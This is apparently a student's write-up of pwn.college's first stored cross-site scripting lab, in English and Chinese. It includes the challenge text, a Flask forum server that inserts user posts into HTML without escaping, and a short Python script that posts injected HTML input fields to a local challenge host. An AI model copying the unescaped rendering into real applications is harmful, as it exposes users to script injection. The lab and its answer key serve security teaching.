#XSS 1
#挑战简介
Semantic gaps can occur (and lead to security issues) at the interface of any two technologies. So far, we have seen them happen between:

A web application and the file system, leading to path traversal.
A web application and the command line shell, leading to command injection.
A web application and the database, leading to SQL injection.
One part of the web application story that we have not yet looked at is the web browser. We will remedy that oversight with this challenge.

A modern web browser is an extraordinarily complex piece of software. It renders HTML, executes JavaScript, parses CSS, lets you access pwn.college, and much much more. 
Specifically important to our purposes is the HTML that you have seen being generated by every challenge in this module. 
When the web application generated paths, we ended up with path traversals. When the web application generated shell commands, we ended up with shell injections. 
When the web application generated SQL queries, we ended up with SQL injections. Do we really think HTML will fare any better? Of course not.

The class of vulnerabilities in which injections occur into client-side web data (such as HTML) is called Cross Site Scripting, or XSS for short 
(to avoid the name collision with Cascading Style Sheets). Unlike the previous injections, where the victim was the web server itself, 
the victims of XSS are other users of the web application. In a typical XSS exploit, an attacker will cause their own code to be injected into (typically) the HTML produced by a 
web application and viewed by a victim user. This will then allow the attacker to gain some control within the victim's browser, leading to a number of potential downstream shenanigans.

This challenge is a very first step in this direction. As before, you will have the /challenge/server web server. This challenge explores something called Stored XSS, 
which means that data that you store on the server (in this case, posts in a forum) will end up being shown to a victim user. Thus, 
we need a victim to view these posts! You will now have a /challenge/victim program that simulates a victim user visiting the web server.

Set up your attack and invoke /challenge/victim with the URL that will trigger the Stored XSS. In this level, all you have to do is inject a textbox. 
If our victim script sees three textboxes, we will give you the flag!

#cat /challenge/server
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE posts AS SELECT "First Post!" AS content""")

@app.route("/", methods=["POST"])
def challenge_post():
    content = flask.request.form.get("content", "")
    db.execute("INSERT INTO posts VALUES (?)", [content])
    return flask.redirect(flask.request.path)

@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n"
    page += "<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>\n"

    for post in db.execute("SELECT content FROM posts").fetchall():
        page += "<hr>" + post["content"] + "\n"

    return page + "</body></html>"

app.secret_key = os.urandom(8)
port = 8080 if os.geteuid() else 80
app.config['SERVER_NAME'] = f"challenge.localhost:{port}"
app.run("challenge.localhost", port)

#本题要求我们向form表单传输三个input文本框，我们需要用到<input type="text">这是HTML语法，用于向用户请求输入
#POST请求我们用python
#!/usr/bin/python3.8
import requests

url = "http://challenge.localhost/"
data = {"content":"<input type=\"text\"><input type=\"text\"><input type=\"text\">" 
}
res = requests.post(url=url,data=data)
print(res.text)

#而后我们用/challenge/victim来检验成果
/challenge/victim http://challenge.localhost/
